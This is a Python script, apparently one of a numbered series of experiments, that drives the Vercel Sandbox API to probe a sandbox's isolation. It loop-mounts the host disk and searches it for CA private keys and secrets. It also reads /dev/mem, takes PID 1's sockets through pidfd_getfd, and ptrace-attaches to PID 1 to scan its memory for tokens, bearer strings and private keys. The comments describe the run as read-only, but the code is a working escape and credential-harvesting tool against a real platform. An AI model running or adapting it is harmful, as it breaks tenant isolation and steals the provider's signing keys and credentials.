# 实验J143: 宿主fs全盘搜索 + /dev/mem物理内存 + ptrace内存侦察 + agent socket识别
# j142: loop挂载宿主根成功, /run/cell/ca-cert.pem磁盘inode无效(宿主内存态) -> CA私钥可能在内存
# 分两个cmd: fs-search(挂载态搜索) + mem-recon(/dev/mem+pidfd socket+ptrace+strings)
# 零破坏: 只读挂载+只读mem, ptrace只读后detach
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj143"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

MOUNT_CODE = r'''
import os, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
print("MOUNT_RC", r)
'''

FS_SEARCH = MOUNT_CODE + r'''
import subprocess
out = open("/tmp/d143a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

p("=== RUN_LS ===")
p(sh("ls -la /tmp/host/run/ 2>&1 | head -40"))
p("=== RUN_SUBDIRS ===")
p(sh("ls -la /tmp/host/run/*/ 2>&1 | head -60"))
p("=== VOLUMES_TREE ===")
p(sh("find /tmp/host/volumes -maxdepth 5 2>&1 | head -50"))
p("=== ROOT_LS ===")
p(sh("ls -la /tmp/host/root/ 2>&1 | head -30"))
p("=== OPT_LS ===")
p(sh("ls -la /tmp/host/opt/ 2>&1 | head -30"))
p("=== FIND_ALL_KEYS ===")
p(sh("find /tmp/host -xdev \\( -name '*ca-key*' -o -name '*key*.pem' -o -name '*.key' -o -name '*private*' -o -name '*secret*' \\) 2>/dev/null | head -80", 120))
p("=== GREP_PRIVKEY ===")
p(sh("grep -rls 'BEGIN.*PRIVATE KEY' /tmp/host/run /tmp/host/etc /tmp/host/opt /tmp/host/var /tmp/host/root /tmp/host/home /tmp/host/volumes /tmp/host/srv /tmp/host/local /tmp/host/tmp /tmp/host/mnt /tmp/host/media /tmp/host/app 2>/dev/null | head -30", 90))
p("=== GREP_CAKEY_TEXT ===")
p(sh("grep -rls 'ca-key' /tmp/host/etc /tmp/host/opt /tmp/host/var /tmp/host/root /tmp/host/home /tmp/host/usr/local /tmp/host/volumes /tmp/host/run 2>/dev/null | head -20", 90))
p("=== GREP_CELL_TEXT ===")
p(sh("grep -rls 'cell.sock\\|/run/cell' /tmp/host/etc /tmp/host/opt /tmp/host/usr/local /tmp/host/root /tmp/host/home /tmp/host/var/lib 2>/dev/null | head -20", 90))
p("=== CAT_CELL_FILES ===")
p(sh("cat /tmp/host/run/cell/ca-cert.pem 2>&1 | head -c 2000; echo; cat /tmp/host/run/cell/cell.sock 2>&1 | head -c 200", 15))
p("=== LIVE_CA_CERT ===")
p(sh("cat /etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem 2>&1 | head -c 2500", 10))
p("=== DONE")
out.close()
'''

MEM_RECON = r'''
import os, subprocess, ctypes, struct, time, re
out = open("/tmp/d143b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

p("=== DEV_MEM ===")
try:
    f = open("/dev/mem", "rb")
    d = f.read(4096)
    f.close()
    p("mem read ok", len(d), d[:16].hex())
except Exception as e:
    p("mem err", repr(e))
p("=== KCORE ===")
p(sh("ls -la /proc/kcore 2>&1; head -c 64 /proc/kcore 2>&1 | xxd 2>/dev/null | head -4; head -c 64 /proc/kcore 2>&1 | od -An -tx1 | head -2", 10))

p("=== AGENT_SOCKETS ===")
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockname.restype = ctypes.c_int
libc.getpeername.restype = ctypes.c_int
libc.getsockopt.restype = ctypes.c_int
libc.close.restype = ctypes.c_int
def sc(nr, *a):
    ctypes.set_errno(0)
    return libc.syscall(nr, *a)
pfd = sc(434, 1, 0)
p("PIDFD", pfd)
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        ln = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        continue
    if "socket:" not in ln:
        continue
    nfd = sc(438, pfd, int(fd), 0)
    if nfd < 0:
        p("fd", fd, "dup_fail", ctypes.get_errno())
        continue
    for label, fn in (("L", libc.getsockname), ("P", libc.getpeername)):
        buf = ctypes.create_string_buffer(256)
        l = ctypes.c_int(256)
        r = fn(nfd, ctypes.cast(buf, ctypes.c_void_p), ctypes.byref(l))
        if r != 0:
            p("fd", fd, label, "err", ctypes.get_errno())
            continue
        fam = struct.unpack_from("H", buf.raw, 0)[0]
        if fam == 1:  # AF_UNIX
            addr = buf.raw[2:l.value].rstrip(b"\x00")
            p("fd", fd, label, "UNIX", repr(addr))
        elif fam == 2:  # AF_INET
            port, ip = struct.unpack_from(">HI", buf.raw, 2)
            p("fd", fd, label, "INET", "%d.%d.%d.%d:%d" % (ip >> 24 & 255, ip >> 16 & 255, ip >> 8 & 255, ip & 255, port))
        elif fam == 40:  # AF_VSOCK
            cid, port = struct.unpack_from(">II", buf.raw, 2)
            p("fd", fd, label, "VSOCK", "cid=%d port=%d" % (cid, port))
        else:
            p("fd", fd, label, "fam", fam, "len", l.value)
    if pfd >= 0:
        cb = ctypes.create_string_buffer(12)
        cl = ctypes.c_int(12)
        r2 = libc.getsockopt(nfd, 1, 17, cb, ctypes.byref(cl))
        if r2 == 0:
            pid, uid, gid = struct.unpack("iii", cb.raw[:12])
            p("fd", fd, "peer(pid=%d uid=%d gid=%d)" % (pid, uid, gid))
    libc.close(nfd)

p("=== PTRACE_DUMP ===")
libc.ptrace.restype = ctypes.c_long
r = libc.ptrace(16, 1, 0, 0)  # PTRACE_ATTACH
p("attach rc", r, "errno", ctypes.get_errno() if r < 0 else 0)
if r == 0:
    time.sleep(1.0)
    pats = [b"BEGIN", b"ca-key", b"vcp_", b"token", b"cell", b"init.sock", b"https://", b"bearer", b"secret", b"PRIVATE KEY", b"signature", b"X-Signature"]
    hits = []
    try:
        maps = open("/proc/1/maps").read()
        mem = open("/proc/1/mem", "rb", 0)
        segs = 0
        for line in maps.splitlines():
            parts = line.split()
            if len(parts) < 2:
                continue
            perms = parts[1]
            if perms[0] != "r":
                continue
            if "w" not in perms:
                continue
            a0, a1 = parts[0].split("-")
            start, end = int(a0, 16), int(a1, 16)
            if end - start > 64 * 1024 * 1024:
                continue
            try:
                mem.seek(start)
                data = mem.read(end - start)
            except Exception:
                continue
            segs += 1
            for pat in pats:
                idx = 0
                while True:
                    i = data.find(pat, idx)
                    if i < 0:
                        break
                    seg = data[max(0, i - 120):i + 200]
                    hits.append((hex(start + i), pat, seg))
                    idx = i + 1
        p("mem segs", segs, "hits", len(hits))
        seen = set()
        for off, pat, seg in hits[:60]:
            k = seg[:60]
            if k in seen:
                continue
            seen.add(k)
            p("OFF", off, pat, repr(seg[:320]))
        mem.close()
    except Exception as e:
        p("MEM_DUMP_ERR", repr(e))
    libc.ptrace(17, 1, 0, 0)  # PTRACE_DETACH
    p("detached")

p("=== STRINGS_INIT ===")
try:
    data = open("/run/vercel/share/sandbox-init", "rb").read()
    strs = re.findall(rb"[\x20-\x7e]{6,}", data)
    kw = (b"vsock", b"cell", b"token", b"http", b"sign", b"proxy", b"cert", b"key", b"sock", b"host", b"port", b"secret", b"bearer", b"vcp_", b"agent", b"connect")
    n = 0
    for s in strs:
        low = s.lower()
        if any(k in low for k in kw):
            p("S:", s[:220])
            n += 1
            if n > 120:
                break
except Exception as e:
    p("STRINGS_ERR", repr(e))
p("=== DONE")
out.close()
'''

run_cmd(sid, FS_SEARCH, "fs-search", timeout=300)
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d143a.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d143a status {c2} ===", flush=True)
print(r2[:15000], flush=True)

run_cmd(sid, MEM_RECON, "mem-recon", timeout=300)
c3, r3 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d143b.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d143b status {c3} ===", flush=True)
print(r3[:20000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
